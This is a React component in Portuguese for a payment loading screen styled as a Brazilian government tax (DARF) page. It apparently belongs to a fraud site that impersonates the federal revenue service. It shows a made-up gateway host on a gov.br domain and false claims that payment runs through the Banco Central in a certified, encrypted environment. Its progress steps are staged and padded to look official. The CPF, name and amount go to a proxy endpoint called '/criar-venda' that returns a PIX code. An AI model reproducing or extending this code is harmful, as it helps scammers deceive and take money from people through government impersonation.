import { useEffect, useState, useRef } from "react";
import { CreditCard, Shield, Lock, CheckCircle, Banknote, QrCode } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface PixLoadingScreenProps {
  cpf: string;
  nome: string;
  valor: number;
  onComplete: (pixCopiaCola: string) => void;
  onError: () => void;
}

const steps = [
  { icon: Lock, title: "Autenticação", subtitle: "Verificando sessão segura" },
  { icon: Banknote, title: "Processamento", subtitle: "Gerando cobrança fiscal" },
  { icon: QrCode, title: "PIX", subtitle: "Criando código de pagamento" },
  { icon: CheckCircle, title: "Finalização", subtitle: "Validando transação" },
];

const formatCurrency = (value: number) =>
  value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixLoadingScreen = ({ cpf, nome, valor, onComplete, onError }: PixLoadingScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    const progressInterval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) return 100;
        return Math.min(p + Math.random() * 1.5 + 0.3, 100);
      });
    }, 250);

    const timers = [
      setTimeout(() => setActiveStep(1), 2000),
      setTimeout(() => setActiveStep(2), 4500),
      setTimeout(() => setActiveStep(3), 7000),
    ];

    const generate = async () => {
      const startTime = Date.now();
      const MIN_DURATION = 8000;
      try {
        const res = await supabase.functions.invoke("api-proxy", {
          body: { endpoint: "/criar-venda", cpf, nome, valor },
        });

        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));

        setProgress(100);
        await new Promise((r) => setTimeout(r, 800));

        if (res.data?.success && res.data?.pixCopiaCola) {
          onComplete(res.data.pixCopiaCola);
        } else {
          onError();
        }
      } catch {
        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));
        onError();
      }
    };

    setTimeout(() => generate(), 300);

    return () => {
      clearInterval(progressInterval);
      timers.forEach(clearTimeout);
    };
  }, [cpf, nome, valor, onComplete, onError]);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader nome={nome} cpf={cpf} />

      <div className="w-full bg-primary/5 border-b border-border py-2">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-xs text-muted-foreground">
          <div className="flex items-center gap-2">
            <Lock className="h-3 w-3 text-accent" />
            <span>Sessão segura • Protocolo TLS 1.3</span>
          </div>
          <span>Gateway: pix-prod.receita.fazenda.gov.br</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-lg animate-fade-in-up">
          <div className="text-center mb-6">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl gradient-primary shadow-lg">
              <CreditCard className="h-8 w-8 text-primary-foreground" />
            </div>
            <h1 className="text-xl font-extrabold text-foreground">Gerando DARF de Pagamento</h1>
            <p className="mt-1 text-sm text-muted-foreground">
              Valor: <span className="font-bold text-destructive">{formatCurrency(valor)}</span>
            </p>
          </div>

          {/* Progress */}
          <div className="mx-auto mb-8 max-w-sm">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-medium text-muted-foreground">Gerando pagamento</span>
              <span className="text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2.5 overflow-hidden rounded-full bg-secondary">
              <div
                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Steps */}
          <div className="mb-8 grid grid-cols-4 gap-2">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isActive = i <= activeStep;
              const isCurrent = i === activeStep;
              return (
                <div
                  key={i}
                  className={`rounded-xl border p-3 text-center transition-all duration-500 ${
                    isCurrent
                      ? "border-primary/40 bg-primary/5 shadow-md"
                      : isActive
                        ? "border-accent/30 bg-card"
                        : "border-transparent bg-card/30"
                  }`}
                >
                  <div className="mb-2 flex justify-center">
                    <div className={`flex h-9 w-9 items-center justify-center rounded-lg transition-all duration-500 ${
                      isCurrent
                        ? "gradient-primary shadow-sm animate-pulse"
                        : isActive
                          ? "bg-accent/10"
                          : "bg-muted"
                    }`}>
                      <Icon className={`h-4 w-4 transition-colors duration-500 ${
                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
                      }`} />
                    </div>
                  </div>
                  <h3 className={`text-xs font-bold transition-colors duration-500 ${
                    isActive ? "text-foreground" : "text-muted-foreground/40"
                  }`}>
                    {step.title}
                  </h3>
                  <p className="mt-0.5 text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                </div>
              );
            })}
          </div>

          <div className="rounded-2xl border border-border bg-card p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-accent/10">
                <Shield className="h-4 w-4 text-accent" />
              </div>
              <div>
                <h4 className="font-bold text-foreground text-sm">Transação Protegida</h4>
                <p className="mt-0.5 text-xs text-muted-foreground leading-relaxed">
                  Pagamento processado via Banco Central do Brasil. Ambiente certificado e criptografado.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <GovFooter />
    </div>
  );
};

export default PixLoadingScreen;
